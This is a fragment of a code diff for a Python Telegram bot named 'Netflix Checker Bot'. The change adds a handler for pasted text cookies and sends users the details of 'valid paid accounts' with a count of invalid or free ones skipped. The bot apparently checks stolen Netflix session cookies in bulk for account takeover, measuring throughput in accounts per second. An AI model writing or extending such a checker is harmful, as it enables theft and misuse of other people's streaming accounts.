+        f"   ├─ Time Taken: {elapsed:.2f} seconds\n"
+        f"   └─ Speed: {speed:.2f} accounts/second"
+    )
+
+    await context.bot.send_message(chat_id, result_text)
+
+    if valid > 0:
+        for acc_name, data in results.items():
+            if data.get("plan_key") != "invalid":
+                details = data.get('details', '')
+                keyboard = data.get('keyboard', None)
+                
+                if details:
+                    if keyboard:
+                        await context.bot.send_message(chat_id, details, reply_markup=keyboard)
+                    else:
+                        await context.bot.send_message(chat_id, details)
+    else:
+        await context.bot.send_message(chat_id, "⚠️ No valid paid accounts found in your message!")
+
+    if invalid > 0:
+        await context.bot.send_message(chat_id, f"⚠️ Invalid/Free accounts: {invalid}\n(These were skipped)")
 
 def main():
     app = Application.builder().token(BOT_TOKEN).build()
@@ -996,8 +1219,8 @@ def main():
     app.add_handler(CommandHandler("help", help_cmd))
     app.add_handler(CommandHandler("stats", stats_cmd))
     app.add_handler(CommandHandler("cancel", cancel_cmd))
-    app.add_handler(CallbackQueryHandler(button_handler))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_cookies))
     
     print("=" * 50)
     print("✅ Netflix Checker Bot is running...")
